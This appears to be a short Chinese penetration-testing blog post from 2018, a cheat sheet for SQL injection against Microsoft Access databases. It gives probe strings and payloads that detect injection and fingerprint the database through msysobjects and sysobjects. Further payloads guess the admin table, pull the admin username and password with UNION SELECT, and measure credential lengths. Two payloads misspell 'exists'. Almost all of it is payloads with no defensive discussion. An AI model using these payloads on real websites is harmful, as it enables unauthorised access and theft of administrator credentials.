---
title: Access数据库注入
date: 2018-10-26
tags: 渗透
categories: "渗透——Access数据库注入"
---


------

### 介绍
> 微软开发的小型数据库，全名：Microsoft Office Access

- 打开工具：
> 辐臣数据库浏览器，破障浏览器

------

<!-- more -->
### 判断注入

- ` ' `
- `and 1=1`
- `and 1=2`
- `or 1=2`
- `id=-xxx`

------

### 判断数据库类型

- `and exsits (select * from msysobjects)>0` （判断是否是access数据库，msysobjects是数据库中的一个表）
- `and exsits (select * from sysobjects)>0` （判断是否是SQLSever数据库）

------

### 判断数据库表

- `and exists (select * from admin)`

------

### 判断数据库表中的字段名

- `and exists (select admin.password from admin)`

------

### 判断字段长度

- ` order by 数字`
- 报错显示内容
> `and 1=2 union select 1,2,3,4,5,6,7,8,9 from admin`
- 猜解密码
> 在报错输出内容中找到报错位置，将字段名与其替换，就会显示字段内容。如：`and 1=2 union select 1,2,admin,4,5,6,password,8,9 from admin`

------

### 判断账户密码长度

- `and (select len(admin) from admin)=5`如果返回正常，则账户长度是为5
- `and (select len(password) from admin)=5`如果返回正常，则密码长度是为5